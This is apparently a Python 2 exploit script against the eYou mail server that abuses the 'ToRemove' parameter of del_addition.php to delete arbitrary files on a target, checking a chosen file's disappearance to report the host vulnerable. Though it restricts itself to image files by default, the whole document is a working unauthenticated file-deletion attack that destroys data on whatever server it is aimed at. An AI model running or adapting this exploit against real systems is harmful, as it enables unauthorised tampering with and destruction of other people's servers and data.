#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function

import os
import sys
import time
import hashlib
from optparse import OptionParser

try:
    import requests
except ImportError, e:
    print("[-] Requests missing, please install requests module")
    sys.exit(0)


def exploit(domain, filename):
    exp_url = "{domain}/user/send_queue/del_addition.php".format(domain=domain)
    test_url = "{domain}/{filename}".format(domain=domain, filename=filename)

    try:
        response = requests.get(test_url, allow_redirects=False)
        if response.status_code == 404:
            print("{filename} does not exists in remote server, del other file ".format(filename=filename))
            return 0
    except Exception, e:
        print("[-] Exception: {exception}".format(exception=e))
        return 0

    try:
        data = {'ToRemove': '/var/eyou/apache/htdocs/{filename}'.format(filename=filename)}
        requests.post(exp_url, data=data, allow_redirects=False)
    except:
        print("[-] Target is not vulnerable") 
        return 0

    try:
        response = requests.get(test_url, allow_redirects=False)
        if response.status_code != 404:
            print("[-] Target is not vulnerable")
            return 0
        else:
            print("[+] Target is vulnerable")
            return 0
    except:
        print("[-] Target is not vulnerable")
        return 0


def main():
    domain = sys.argv[1]
    port = sys.argv[2]
    filename = "/images/login/logo.gif"

    if os.path.splitext(filename)[1] not in ('.jpg', '.png', '.gif', '.ico'):
        print("[-] I don't want to ruin this site, so just delete some images")
        sys.exit(0)

    domain = domain if domain.startswith('http') else "http://{domain}:{port}".format(domain=domain,port=str(port))
    domain = domain if not domain.endswith('/') else domain[:-1]
    filename = filename if not filename.startswith('/') else filename[1:]

    return exploit(domain, filename)


if __name__ == "__main__":
    main()
